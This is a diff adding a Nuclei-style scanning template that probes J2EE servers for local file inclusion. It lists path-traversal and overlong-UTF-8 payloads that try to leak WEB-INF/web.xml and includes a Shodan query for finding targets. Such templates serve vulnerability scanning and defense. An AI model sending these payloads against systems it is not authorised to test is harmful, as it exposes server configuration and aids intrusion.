@@ -1,0 +1,41 @@
+id: generic-j2ee-lfi
+info:
+  author: davidfegyver
+  description: Looks for J2EE specific LFI vulnerabilities, tries to leak the web.xml
+    file.
+  metadata:
+    shodan-query: http.title:"J2EE"
+    verified: true
+  name: Generic J2EE LFI scan
+  reference:
+  - https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LFIModule.java
+  severity: high
+  tags: lfi,generic,j2ee
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - <servlet-name>
+    - </web-app>
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/../../../../WEB-INF/web.xml'
+  - '{{BaseURL}}/../../../WEB-INF/web.xml'
+  - '{{BaseURL}}/../../WEB-INF/web.xml'
+  - '{{BaseURL}}/%c0%ae/%c0%ae/WEB-INF/web.xml'
+  - '{{BaseURL}}/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
+  - '{{BaseURL}}/%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
+  - '{{BaseURL}}/../../../WEB-INF/web.xml;x='
+  - '{{BaseURL}}/../../WEB-INF/web.xml;x='
+  - '{{BaseURL}}/../WEB-INF/web.xml;x='
+  - '{{BaseURL}}/WEB-INF/web.xml'
+  - '{{BaseURL}}/.//WEB-INF/web.xml'
+  - '{{BaseURL}}/../WEB-INF/web.xml'
+  - '{{BaseURL}}/%c0%ae/WEB-INF/web.xml'
+  stop-at-first-match: true
